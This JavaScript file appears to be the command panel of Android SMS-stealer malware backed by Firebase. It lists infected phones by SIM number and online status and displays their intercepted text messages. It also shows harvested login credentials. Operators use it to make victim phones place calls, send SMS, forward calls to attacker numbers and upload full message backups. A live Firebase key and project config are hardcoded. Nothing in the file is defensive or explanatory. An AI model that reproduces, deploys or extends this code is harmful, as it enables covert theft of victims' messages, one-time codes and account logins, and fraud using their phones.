/* ============================================================ */
/* app.js - Ultra Fast Firebase Loader                          */
/* ============================================================ */

// ============================================================
// FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
    apiKey: "AIzaSyAzStFCeODQmVbydsq1yxPHryz-cqM8lrU",
    authDomain: "hello4211.firebaseapp.com",
    databaseURL: "https://hello4211-default-rtdb.firebaseio.com",
    projectId: "hello4211",
    storageBucket: "hello4211.firebasestorage.app",
    messagingSenderId: "11131576643",
    appId: "1:11131576643:web:64e4153cee7cb7847e4ff6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ============================================================
// STATE - FAST CACHE
// ============================================================
let cachedData = {};
let expandedDevices = {};
let activeTabs = {};
let isPanelOpen = { devices: false, sms: false, backup: false };
let formMemory = {};

// Pagination
let deviceOffset = 0;
const DEVICE_LIMIT = 10;
let allDeviceKeys = [];

let allSmsList = [];
let allSmsOffset = 0;
const SMS_LIMIT = 15;

let modalSmsList = [];
let modalSmsOffset = 0;
let modalTarget = 'ALL';

let deviceSmsCache = {};

// ============================================================
// DOM REFS
// ============================================================
const $ = (id) => document.getElementById(id);

// ============================================================
// CONNECTION MONITOR - FAST
// ============================================================
db.ref(".info/connected").on("value", (snap) => {
    const badge = $('statusBadge');
    const text = $('statusText');
    if (snap.val() === true) {
        badge.className = 'status-badge online';
        text.textContent = 'Online';
    } else {
        badge.className = 'status-badge offline';
        text.textContent = 'Offline';
    }
});

// ============================================================
// MAIN DATA LISTENER - INSTANT LOAD
// ============================================================
let firstLoad = true;

db.ref().on("value", (snapshot) => {
    cachedData = snapshot.val() || {};

    const active = document.activeElement;
    const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
    if (typing) return;

    // Render everything instantly
    renderAll();

    // Auto-open devices on first load
    if (firstLoad) {
        firstLoad = false;
        setTimeout(() => {
            if (!isPanelOpen.devices) {
                togglePanel('devices');
            }
        }, 100);
    }
});

// ============================================================
// RENDER ALL - FAST
// ============================================================
function renderAll() {
    renderDevices();
    renderAllSms();
    updateBackupDeviceList();

    // Update counts instantly
    const devices = cachedData.user_data || {};
    const keys = Object.keys(devices);
    $('deviceCount').textContent = keys.length;
    $('panelDeviceCount').textContent = keys.length + ' devices';

    const smsData = cachedData.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => {
        totalSms += Object.keys(smsData[d]).length;
    });
    $('smsCount').textContent = totalSms;
    $('panelSmsCount').textContent = totalSms + ' messages';

    if (isPanelOpen.backup) {
        const selected = $('backupDeviceSelect').value;
        if (selected) {
            updateBackupStatusDisplay(selected);
            loadBackupSmsForDevice(selected);
        }
    }
}

// ============================================================
// TOGGLE PANELS
// ============================================================
function togglePanel(panel) {
    const panels = ['devices', 'sms', 'backup'];
    const btnMap = {
        devices: 'btnDevices',
        sms: 'btnSms',
        backup: 'btnBackup'
    };

    panels.forEach(p => {
        if (p !== panel) {
            $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`).classList.remove('active');
            $(btnMap[p]).classList.remove('active');
            isPanelOpen[p] = false;
        }
    });

    const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
    const btn = $(btnMap[panel]);
    isPanelOpen[panel] = !isPanelOpen[panel];

    if (isPanelOpen[panel]) {
        panelEl.classList.add('active');
        btn.classList.add('active');
        if (panel === 'devices') renderDevices();
        if (panel === 'sms') renderAllSms();
        if (panel === 'backup') {
            updateBackupDeviceList();
            const selected = $('backupDeviceSelect').value;
            if (selected) {
                updateBackupStatusDisplay(selected);
                loadBackupSmsForDevice(selected);
            }
        }
    } else {
        panelEl.classList.remove('active');
        btn.classList.remove('active');
    }
}

// ============================================================
// RENDER DEVICES - FAST WITH PAGINATION
// ============================================================
function renderDevices() {
    const container = $('devicesContainer');
    const devices = cachedData.user_data || {};
    allDeviceKeys = Object.keys(devices);

    if (allDeviceKeys.length === 0) {
        container.innerHTML = `<div class="no-data"><i class="fas fa-mobile-alt"></i> No devices registered</div>`;
        return;
    }

    const start = deviceOffset;
    const end = Math.min(start + DEVICE_LIMIT, allDeviceKeys.length);
    const displayKeys = allDeviceKeys.slice(start, end);
    const hasMore = end < allDeviceKeys.length;

    let html = '';

    displayKeys.forEach((devId) => {
        const dev = devices[devId] || {};

        let online = dev.isOnline || dev.online || false;
        const lastSeen = dev.last_online || dev.timestamp;
        if (!online && lastSeen && (Date.now() - lastSeen < 120000)) online = true;

        const statusClass = online ? 'online' : 'offline';
        const statusText = online ? '🟢 Online' : '🔴 Offline';
        const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';

        const smsData = cachedData.user_sms || {};
        let devSmsList = [];
        let totalSms = 0;
        if (smsData[devId]) {
            const keys = Object.keys(smsData[devId]);
            totalSms = keys.length;
            if (!deviceSmsCache[devId]) {
                deviceSmsCache[devId] = { offset: 0, all: [] };
                keys.forEach(k => deviceSmsCache[devId].all.push(smsData[devId][k]));
            }
            const cache = deviceSmsCache[devId];
            const startIdx = cache.offset;
            const endIdx = Math.min(startIdx + SMS_LIMIT, cache.all.length);
            devSmsList = cache.all.slice(startIdx, endIdx).reverse();
        }

        const isExpanded = expandedDevices[devId] || false;
        const activeTab = activeTabs[devId] || null;
        const hasMoreSms = deviceSmsCache[devId] &&
            (deviceSmsCache[devId].offset + SMS_LIMIT < deviceSmsCache[devId].all.length);

        const loginData = cachedData.login || {};
        let devLoginList = [];
        if (loginData[devId]) {
            Object.keys(loginData[devId]).forEach(k => devLoginList.push(loginData[devId][k]));
            devLoginList.reverse();
        }

        html += `
            <div class="device-card ${isExpanded ? 'expanded' : ''}" id="card-${devId}" onclick="toggleDevice('${devId}')">
                <div class="device-header">
                    <div>
                        <div class="device-title">📱 ${devId}</div>
                        <div style="font-size:10px;color:var(--text-muted);margin-top:1px;">
                            ${isExpanded ? '▲ Click to collapse' : '▼ Click to expand'}
                        </div>
                    </div>
                    <div style="text-align:right;">
                        <span class="device-status ${statusClass}">${statusText}</span>
                        <div style="font-size:9px;color:var(--text-muted);margin-top:1px;">${timeStr}</div>
                    </div>
                </div>

                <div class="device-info-grid">
                    <div class="item"><span>Device</span><b>${dev.Device_info || 'N/A'}</b></div>
                    <div class="item"><span>SIM 1</span><b>${dev.numberSim1 || 'N/A'}</b></div>
                    <div class="item"><span>SIM 2</span><b>${dev.numberSim2 || 'N/A'}</b></div>
                </div>

                <div class="device-body">
                    <div class="device-actions">
                        <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
                            💬 ${totalSms}
                        </button>
                        <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">
                            🔑 ${devLoginList.length}
                        </button>
                        <button class="sub-btn ${activeTab === 'call' ? 'active-call' : ''}" onclick="event.stopPropagation();setTab('${devId}','call')">📞</button>
                        <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
                        <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
                        <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
                    </div>

                    <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
                            <h4 style="color:var(--blue);margin:0;font-size:12px;">💬 SMS (${totalSms})</h4>
                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--blue);color:#fff;border:none;padding:2px 10px;border-radius:6px;font-size:10px;cursor:pointer;">⛶</button>
                        </div>
                        <div class="sms-card-list">
                            ${renderSmsCards(devSmsList)}
                            ${devSmsList.length === 0 ? '<div class="no-data">No SMS</div>' : ''}
                        </div>
                        ${hasMoreSms ? `<button class="load-more-btn" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                    </div>

                    <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                        <h4 style="color:var(--orange);font-size:12px;">🔑 Credentials</h4>
                        <div class="table-wrapper">
                            <table>
                                <thead><tr><th>Fields</th></tr></thead>
                                <tbody>
                                    ${devLoginList.length === 0 ? '<tr><td class="no-data">No credentials</td></tr>' :
                                    devLoginList.map(rec => {
                                        let txt = '';
                                        for (let k in rec) txt += `<b>${k}:</b> ${rec[k]}<br>`;
                                        return `<tr><td>${txt}</td></tr>`;
                                    }).join('')}
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                        <h4 style="color:var(--green);font-size:12px;">📞 Call</h4>
                        <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
                        <select id="callSim-${devId}" onchange="formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()">
                            <option value="0" ${(formMemory[`callSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                            <option value="1" ${(formMemory[`callSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                        </select>
                        <button class="cmd-btn purple-btn" onclick="event.stopPropagation();sendCall('${devId}')"><i class="fas fa-phone"></i> Call</button>
                    </div>

                    <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                        <h4 style="color:var(--purple);font-size:12px;">✉️ Send SMS</h4>
                        <input type="text" id="smsNum-${devId}" value="${formMemory[`smsNum-${devId}`] || ''}" placeholder="Recipient" oninput="formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
                        <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()">${formMemory[`smsText-${devId}`] || ''}</textarea>
                        <select id="smsSim-${devId}" onchange="formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()">
                            <option value="1" ${(formMemory[`smsSim-${devId}`] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
                            <option value="2" ${(formMemory[`smsSim-${devId}`] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
                        </select>
                        <button class="cmd-btn blue-btn" onclick="event.stopPropagation();sendSms('${devId}')"><i class="fas fa-paper-plane"></i> Send</button>
                    </div>

                    <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                        <h4 style="color:var(--red);font-size:12px;">🔀 Forward</h4>
                        <input type="text" id="fwdNum-${devId}" value="${formMemory[`fwdNum-${devId}`] || ''}" placeholder="Forward To" oninput="formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
                        <select id="fwdSim-${devId}" onchange="formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()">
                            <option value="0" ${(formMemory[`fwdSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                            <option value="1" ${(formMemory[`fwdSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                        </select>
                        <button class="cmd-btn" style="background:var(--green);color:#fff;margin-bottom:4px;" onclick="event.stopPropagation();sendFwd('${devId}','call forward')"><i class="fas fa-play"></i> Activate</button>
                        <button class="cmd-btn danger-btn" onclick="event.stopPropagation();sendFwd('${devId}','forward off')"><i class="fas fa-stop"></i> Deactivate</button>
                    </div>

                    <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                        <h4 style="color:var(--cyan);font-size:12px;">💾 Backup</h4>
                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">
                            <button class="cmd-btn purple-btn" onclick="event.stopPropagation();triggerDeviceBackup('${devId}')"><i class="fas fa-database"></i> Backup</button>
                            <button class="cmd-btn blue-btn" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')"><i class="fas fa-sync"></i> Refresh</button>
                        </div>
                        <div id="deviceBackup-${devId}" style="margin-top:6px;padding:6px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
                            Click Refresh to check status...
                        </div>
                    </div>
                </div>
            </div>
        `;
    });

    container.innerHTML = html;

    if (hasMore) {
        container.innerHTML += `
            <button class="load-more-btn" onclick="loadMoreDevices()">
                <i class="fas fa-chevron-down"></i> Load More (${allDeviceKeys.length - end} remaining)
            </button>
        `;
    }
}

// ============================================================
// RENDER SMS CARDS - FAST
// ============================================================
function renderSmsCards(list, showDevice = false) {
    if (!list || list.length === 0) return '';
    return list.map(msg => `
        <div class="sms-card">
            <div class="sms-card-header">
                <div class="sms-sender">
                    ${showDevice ? `<span class="device-tag">[${msg.deviceId}]</span> ` : ''}
                    👤 ${msg.sender || msg.address || 'Unknown'}
                </div>
                <div class="sms-meta">
                    ${msg.date_formatted || msg.date || ''} ${msg.sim_number ? '• ' + msg.sim_number : ''}
                </div>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
        </div>
    `).join('');
}

// ============================================================
// BACKUP SMS FUNCTIONS - INSTANT
// ============================================================
function loadBackupSmsForDevice(devId) {
    const container = $('backupSmsList');
    if (!devId) {
        container.innerHTML = '<div class="no-data" style="padding:12px;">Select a device</div>';
        return;
    }

    // Check cached data first
    const backupData = cachedData.backup_sms;
    if (backupData && backupData[devId]) {
        renderBackupSmsList(container, backupData[devId]);
        return;
    }

    container.innerHTML = '<div class="loading-placeholder" style="padding:8px;"><i class="fas fa-spinner fa-spin"></i></div>';

    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
        if (snap.exists()) {
            renderBackupSmsList(container, snap.val());
        } else {
            container.innerHTML = '<div class="no-data" style="padding:12px;">No backup SMS found</div>';
        }
    }).catch(() => {
        container.innerHTML = '<div class="no-data" style="padding:12px;color:var(--red);">❌ Error loading</div>';
    });
}

function renderBackupSmsList(container, data) {
    const messages = [];
    Object.keys(data).forEach(key => {
        messages.push({ key, ...data[key] });
    });
    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

    if (messages.length === 0) {
        container.innerHTML = '<div class="no-data" style="padding:12px;">No backup SMS</div>';
        return;
    }

    container.innerHTML = messages.map(msg => `
        <div class="backup-sms-item">
            <div class="sms-header">
                <span class="sender">👤 ${msg.sender || msg.address || 'Unknown'}</span>
                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
            </div>
        </div>
    `).join('');
}

// ============================================================
// OPEN BACKUP SMS MODAL - INSTANT
// ============================================================
function openBackupSmsModal() {
    const modal = $('backupSmsModal');
    const body = $('backupModalBody');
    const title = $('backupModalTitle');

    title.textContent = '💾 All Backup SMS';
    body.innerHTML = '<div class="loading-placeholder"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
    modal.classList.add('open');

    const backupData = cachedData.backup_sms;
    if (backupData) {
        renderAllBackupSms(body, backupData);
        return;
    }

    db.ref('backup_sms').once('value').then(snap => {
        if (snap.exists()) {
            renderAllBackupSms(body, snap.val());
        } else {
            body.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i> No backup SMS found</div>';
        }
    }).catch(() => {
        body.innerHTML = '<div class="no-data" style="color:var(--red);">❌ Error loading</div>';
    });
}

function renderAllBackupSms(container, data) {
    let allMsgs = [];
    Object.keys(data).forEach(devId => {
        const devMsgs = data[devId];
        Object.keys(devMsgs).forEach(key => {
            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
        });
    });
    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

    if (allMsgs.length === 0) {
        container.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i> No backup SMS</div>';
        return;
    }

    container.innerHTML = allMsgs.map(msg => `
        <div class="backup-sms-item">
            <div class="sms-header">
                <span class="sender">
                    <span style="color:var(--green);font-size:10px;">[${msg.deviceId}]</span>
                    👤 ${msg.sender || msg.address || 'Unknown'}
                </span>
                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
            </div>
            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
            </div>
        </div>
    `).join('');
}

function closeBackupSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    $('backupSmsModal').classList.remove('open');
}

// ============================================================
// ALL SMS - INSTANT
// ============================================================
function renderAllSms() {
    const container = $('allSmsContainer');
    const loadMore = $('allSmsLoadMore');

    if (allSmsOffset === 0) {
        allSmsList = [];
        const smsData = cachedData.user_sms || {};
        Object.keys(smsData).forEach(devId => {
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                allSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
        allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    }

    if (allSmsList.length === 0) {
        container.innerHTML = `<div class="no-data"><i class="fas fa-inbox"></i> No SMS found</div>`;
        loadMore.style.display = 'none';
        return;
    }

    const start = allSmsOffset;
    const end = Math.min(start + SMS_LIMIT, allSmsList.length);
    const paginated = allSmsList.slice(start, end);

    if (allSmsOffset === 0) {
        container.innerHTML = renderSmsCards(paginated, true);
    } else {
        container.innerHTML += renderSmsCards(paginated, true);
    }

    if (end < allSmsList.length) {
        loadMore.style.display = 'block';
        loadMore.textContent = `📥 Load More (${allSmsList.length - end} remaining)`;
    } else {
        loadMore.style.display = 'none';
    }
}

// ============================================================
// LOAD MORE FUNCTIONS
// ============================================================
function loadMoreDevices() {
    deviceOffset += DEVICE_LIMIT;
    renderDevices();
}

function loadMoreDeviceSms(devId) {
    if (deviceSmsCache[devId]) {
        deviceSmsCache[devId].offset += SMS_LIMIT;
        renderDevices();
        expandedDevices[devId] = true;
        activeTabs[devId] = 'sms';
    }
}

function loadMoreAllSms() {
    allSmsOffset += SMS_LIMIT;
    renderAllSms();
}

function loadMoreModalSms() {
    modalSmsOffset += SMS_LIMIT;
    renderModalSms();
}

// ============================================================
// MODAL FUNCTIONS
// ============================================================
function openSmsModal(target) {
    modalTarget = target;
    modalSmsOffset = 0;
    modalSmsList = [];

    const smsData = cachedData.user_sms || {};
    if (target === 'ALL') {
        $('modalTitle').textContent = '📩 All SMS';
        Object.keys(smsData).forEach(devId => {
            const msgs = smsData[devId];
            Object.keys(msgs).forEach(k => {
                modalSmsList.push({ deviceId: devId, ...msgs[k] });
            });
        });
    } else {
        $('modalTitle').textContent = `📩 SMS for ${target}`;
        if (smsData[target]) {
            Object.keys(smsData[target]).forEach(k => {
                modalSmsList.push(smsData[target][k]);
            });
        }
    }

    modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    renderModalSms();
    $('smsModal').classList.add('open');
}

function renderModalSms() {
    const body = $('modalBody');
    const loadMore = $('modalLoadMore');

    const start = modalSmsOffset;
    const end = Math.min(start + SMS_LIMIT, modalSmsList.length);
    const paginated = modalSmsList.slice(start, end);

    if (modalSmsOffset === 0) {
        body.innerHTML = renderSmsCards(paginated, modalTarget === 'ALL');
    } else {
        body.innerHTML += renderSmsCards(paginated, modalTarget === 'ALL');
    }

    if (end < modalSmsList.length) {
        loadMore.style.display = 'block';
        loadMore.textContent = `📥 Load More (${modalSmsList.length - end} remaining)`;
    } else {
        loadMore.style.display = 'none';
    }
}

function closeSmsModal(e) {
    if (e && e.target !== e.currentTarget) return;
    $('smsModal').classList.remove('open');
}

// ============================================================
// DEVICE UI HELPERS
// ============================================================
function toggleDevice(devId) {
    expandedDevices[devId] = !expandedDevices[devId];
    renderDevices();
}

function setTab(devId, tab) {
    if (activeTabs[devId] === tab) {
        activeTabs[devId] = null;
    } else {
        activeTabs[devId] = tab;
        if (tab === 'backup') refreshDeviceBackup(devId);
    }
    renderDevices();
    expandedDevices[devId] = true;
}

// ============================================================
// COMMAND FUNCTIONS
// ============================================================
function sendCall(devId) {
    const number = $(`callNum-${devId}`).value.trim();
    const simSlot = $(`callSim-${devId}`).value;
    if (!number) return showToast('Enter phone number!', 'warning');

    db.ref(`user_data/${devId}`).update({
        device: devId,
        simSlot: simSlot,
        adminNumber: number,
        command: 'make call',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Call sent to ${devId}`, 'success');
        $(`callNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendSms(devId) {
    const number = $(`smsNum-${devId}`).value.trim();
    const text = $(`smsText-${devId}`).value.trim();
    const simSlot = $(`smsSim-${devId}`).value;
    if (!number || !text) return showToast('Enter both number and message!', 'warning');

    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        phoneNumber: number,
        messageText: text,
        simSlot: simSlot,
        command: 'send message',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ SMS sent to ${devId}`, 'success');
        $(`smsNum-${devId}`).value = '';
        $(`smsText-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

function sendFwd(devId, cmd) {
    const number = $(`fwdNum-${devId}`).value.trim();
    const simSlot = $(`fwdSim-${devId}`).value;
    if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');

    db.ref(`user_data/${devId}`).update({
        targetDeviceId: devId,
        simSlot: simSlot,
        phoneNumber: number || '',
        command: cmd,
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Forward (${cmd}) sent`, 'success');
        $(`fwdNum-${devId}`).value = '';
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// BACKUP FUNCTIONS - FAST
// ============================================================
function updateBackupDeviceList() {
    const select = $('backupDeviceSelect');
    const devices = cachedData.user_data || {};
    const keys = Object.keys(devices);
    const current = select.value;
    select.innerHTML = '<option value="">-- Select --</option>';
    keys.forEach(id => {
        const dev = devices[id];
        const name = dev.d_name || dev.device_name || id;
        const serial = dev.user_serial || '';
        const label = serial ? `#${serial} ${name}` : name;
        select.innerHTML += `<option value="${id}">${label}</option>`;
    });
    if (current && keys.includes(current)) select.value = current;
}

function updateBackupStatusDisplay(devId) {
    const dev = cachedData.user_data?.[devId];
    if (!dev) {
        $('backupStatusValue').textContent = 'Device not found';
        $('backupStatusValue').className = 'value failed';
        return;
    }

    const status = dev.backup_status || {};
    const info = dev.backup_info || {};

    const st = status.backup_status || 'No backup';
    const msg = status.backup_message || '';

    const statusEl = $('backupStatusValue');
    if (st === 'success') {
        statusEl.textContent = '✅ ' + (msg || 'Backup successful');
        statusEl.className = 'value success';
    } else if (st === 'in_progress' || st === 'pending') {
        statusEl.textContent = '⏳ ' + (msg || 'In progress...');
        statusEl.className = 'value pending';
    } else if (st === 'failed' || st === 'error') {
        statusEl.textContent = '❌ ' + (msg || 'Backup failed');
        statusEl.className = 'value failed';
    } else {
        statusEl.textContent = '📊 ' + (msg || 'No backup');
        statusEl.className = 'value';
    }

    const last = info.last_backup_time || info.timestamp || null;
    $('backupLastTime').textContent = last ? new Date(last).toLocaleString() : 'Never';

    const count = info.latest_backup_count || info.sms_count || 0;
    $('backupSmsCount').textContent = count + ' SMS';

    $('backupId').textContent = info.backup_id || status.backup_id || 'N/A';

    const badge = $('backupStatusBadge');
    badge.textContent = st === 'success' ? '✅ Ready' : '⏳ Pending';
}

function triggerBackup() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    triggerDeviceBackup(devId);
}

function triggerDeviceBackup(devId) {
    if (!devId) return;
    $('backupStatusValue').textContent = '⏳ Sending...';
    $('backupStatusValue').className = 'value pending';

    db.ref(`user_data/${devId}`).update({
        device: devId,
        command: 'backup',
        timestamp: Date.now(),
        isOnline: true
    }).then(() => {
        showToast(`✅ Backup command sent to ${devId}`, 'success');
        setTimeout(refreshBackupStatus, 3000);
    }).catch(() => {
        $('backupStatusValue').textContent = '❌ Failed';
        $('backupStatusValue').className = 'value failed';
        showToast('❌ Failed to send', 'error');
    });
}

function refreshBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');

    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        if (snap.exists()) {
            if (!cachedData.user_data) cachedData.user_data = {};
            if (!cachedData.user_data[devId]) cachedData.user_data[devId] = {};
            cachedData.user_data[devId].backup_status = snap.val();
        }
        updateBackupStatusDisplay(devId);
        loadBackupSmsForDevice(devId);
        showToast('✅ Status refreshed', 'success');
    }).catch(() => showToast('❌ Failed', 'error'));
}

function refreshDeviceBackup(devId) {
    const div = document.getElementById(`deviceBackup-${devId}`);
    if (!div) return;
    div.innerHTML = '⏳ Checking...';

    db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
        let html = '';
        if (snap.exists()) {
            const data = snap.val();
            const st = data.backup_status || 'Unknown';
            const msg = data.backup_message || '';
            let color = 'var(--text-muted)';
            let icon = '📊';
            if (st === 'success') { color = 'var(--green)';
                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = 'var(--orange)';
                icon = '⏳'; } else if (st === 'failed' || st === 'error') { color = 'var(--red)';
                icon = '❌'; }
            html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;

            db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
                if (infoSnap.exists()) {
                    const info = infoSnap.val();
                    const count = info.latest_backup_count || info.sms_count || 0;
                    const last = info.last_backup_time || info.timestamp || null;
                    html += `<div style="font-size:10px;color:var(--text-muted);margin-top:3px;">📨 ${count} SMS | ${last ? '📅 ' + new Date(last).toLocaleString() : 'No time'}</div>`;
                }
                div.innerHTML = html;
            });
        } else {
            div.innerHTML = '📊 No backup status';
        }
    }).catch(() => {
        div.innerHTML = '❌ Error loading';
    });
}

function clearBackupStatus() {
    const devId = $('backupDeviceSelect').value;
    if (!devId) return showToast('Select a device!', 'warning');
    if (!confirm(`Clear backup status for ${devId}?`)) return;

    db.ref(`user_data/${devId}/backup_status`).remove().then(() => {
        db.ref(`user_data/${devId}/backup_info`).remove().then(() => {
            showToast(`✅ Cleared for ${devId}`, 'success');
            updateBackupStatusDisplay(devId);
            loadBackupSmsForDevice(devId);
        });
    }).catch(() => showToast('❌ Failed', 'error'));
}

// ============================================================
// TOAST
// ============================================================
function showToast(message, type = 'info', duration = 2500) {
    const container = $('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    container.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, duration);
}

// ============================================================
// UTILITY
// ============================================================
function escapeHtml(text) {
    if (!text) return '';
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ============================================================
// BACKUP DEVICE SELECT LISTENER
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    $('backupDeviceSelect').addEventListener('change', function() {
        const id = this.value;
        if (id) {
            updateBackupStatusDisplay(id);
            loadBackupSmsForDevice(id);
            refreshDeviceBackup(id);
        } else {
            $('backupSmsList').innerHTML = '<div class="no-data" style="padding:12px;">Select a device</div>';
        }
    });
});